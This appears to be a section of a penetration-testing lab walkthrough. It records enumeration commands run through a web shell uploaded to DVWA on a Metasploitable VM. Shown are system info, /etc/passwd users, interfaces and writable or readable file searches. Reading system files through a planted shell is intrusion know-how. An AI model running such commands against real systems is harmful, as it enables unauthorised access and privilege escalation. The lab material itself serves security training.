# 04 - Basic Enumeration

## 4.1 - System

```
www-data@172.28.128.8:/var/www/dvwa/vulnerabilities $ system_info
The remote script execution triggers an error 500, check script and payload integrity
The remote script execution triggers an error 500, check script and payload integrity
+--------------------+--------------------------------------------------------------------------------+
| document_root      | /var/www/                                                                      |
| whoami             | www-data                                                                       |
| hostname           |                                                                                |
| pwd                | /var/www/dvwa/vulnerabilities                                                  |
| open_basedir       |                                                                                |
| safe_mode          | False                                                                          |
| script             | /dvwa/hackable/uploads/shell.php                                               |
| script_folder      | /var/www/dvwa/hackable/uploads                                                 |
| uname              | Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 |
| os                 | Linux                                                                          |
| client_ip          | 172.28.128.14                                                                  |
| max_execution_time | 30                                                                             |
| php_self           | /dvwa/hackable/uploads/shell.php                                               |
| dir_sep            | /                                                                              |
| php_version        | 5.2.4-2ubuntu5.10                                                              |
+--------------------+--------------------------------------------------------------------------------+
```

## 4.2 - Usernames

```
www-data@172.28.128.8:/var/www/dvwa/vulnerabilities $ audit_etcpasswd
The remote script execution triggers an error 500, check script and payload integrity
root:x:0:0:root:/root:/bin/bash
..[snip]..
msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
service:x:1002:1002:,,,:/home/service:/bin/bash
```

## 4.3 - Network

```
www-data@172.28.128.8:/var/www/dvwa/vulnerabilities $ net_ifconfig
The remote script execution triggers an error 500, check script and payload integrity
+------+-----------------+
| eth0 | 172.28.128.8/24 |
| lo   | 127.0.0.1/8     |
+------+-----------------+
```

## 4.4 - SUID and SGID

```
audit_suidsgid
```

## 4.5 - Audit Filesystem

```
www-data@172.28.128.8:/var/www/dvwa/vulnerabilities $ audit_filesystem
The remote script execution triggers an error 500, check script and payload integrity
Search executable files in /home/ folder
/home/
/home/service
/home/ftp
/home/user
/home/msfadmin
Search writable files in /home/ folder
Search certain readable files in etc folder
/etc/apparmor.d/abstractions/ssl_keys
/etc/X11/fluxbox/keys
/etc/X11/xkb/compat/mousekeys
/etc/X11/xkb/types/mousekeys
Search certain readable log files
/var/log/dpkg.log
/var/log/wtmp
/var/log/udev
/var/log/boot
/var/log/lastlog
Search writable files in /var/spool/cron/ folder
Search writable files in binary folders
/lib/udev/devices/stderr
/lib/udev/devices/fd
/lib/udev/devices/stdin
/lib/udev/devices/stdout
/lib/udev/devices/fd/0
/lib/udev/devices/fd/1
/lib/udev/devices/fd/2
/lib/udev/devices/fd/3
Search writable files in etc folder
Search writable files in / folder
/tmp
```

## 4.6 - PHP Config

```
audit_phpconf
```

:file_grep                    Print lines matching a pattern in multiple files.
:file_enum                    Check existence and permissions of a list of paths.
:system_procs                 List running processes.